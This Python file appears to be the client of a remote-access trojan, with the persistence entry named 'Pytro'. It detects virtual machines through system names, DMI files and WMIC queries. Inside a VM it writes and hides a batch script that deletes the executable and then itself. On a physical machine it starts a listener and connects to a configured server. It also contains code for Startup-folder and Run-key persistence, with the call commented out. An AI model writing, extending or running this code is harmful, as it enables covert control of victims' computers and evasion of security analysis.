import os
import platform
import shutil
import subprocess
import sys
import threading
import winreg

from config import server_url
from media_utils import start_listener
from network_utils import start_client


def check_vm():
    uname = platform.uname()
    common_vm_signals = ["vm", "virtual", "hyperv", "xen", "kvm", "vbox", "qemu"]
    if any(signal in uname.system.lower() for signal in common_vm_signals):
        return True

    if platform.system() == "Linux":
        dmi_paths = ["/sys/class/dmi/id/product_name", "/sys/class/dmi/id/sys_vendor", "/sys/class/dmi/id/bios_vendor"]
        for path in dmi_paths:
            try:
                with open(path, 'r') as file:
                    content = file.read().lower()
                    if any(vm in content for vm in ["vmware", "kvm", "xen", "virtualbox"]):
                        return True
            except FileNotFoundError:
                continue

    if platform.system() == "Windows":
        wmic_commands = [("bios", "get", "manufacturer"), ("computersystem", "get", "model")]
        for command in wmic_commands:
            try:
                result = subprocess.check_output(["wmic"] + list(command), text=True)
                if any(vm in result.lower() for vm in ["vmware", "virtualbox", "microsoft corporation"]):
                    return True
            except subprocess.CalledProcessError:
                continue

    return False


def add_to_startup(file_path=None):
    if file_path is None:
        file_path = os.path.abspath(sys.argv[0])

    startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')

    destination_file = os.path.join(startup_folder, os.path.basename(file_path))

    if os.path.abspath(file_path) != os.path.abspath(destination_file):
        shutil.copy(file_path, destination_file)
    else:
        destination_file = file_path

    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0,
                         winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, 'Pytro', 0, winreg.REG_SZ, destination_file)
    winreg.CloseKey(key)


def create_deletion_batch():
    batch_content = """
@echo off
:loop
del "client.exe"
if exist "client.exe" goto loop
del "%~f0"
"""
    batch_path = os.path.join(os.path.dirname(sys.argv[0]), "delete_client.bat")
    with open(batch_path, "w") as batch_file:
        batch_file.write(batch_content)
    return batch_path


def self_destruction():
    try:
        batch_path = create_deletion_batch()
        subprocess.Popen(batch_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception as e:
        pass


def main():
    if check_vm():
        self_destruction()
    else:
        print("Running on a physical machine.")
        # add_to_startup()
        threading.Thread(target=start_listener).start()
        start_client(server_url)


if __name__ == '__main__':
    main()
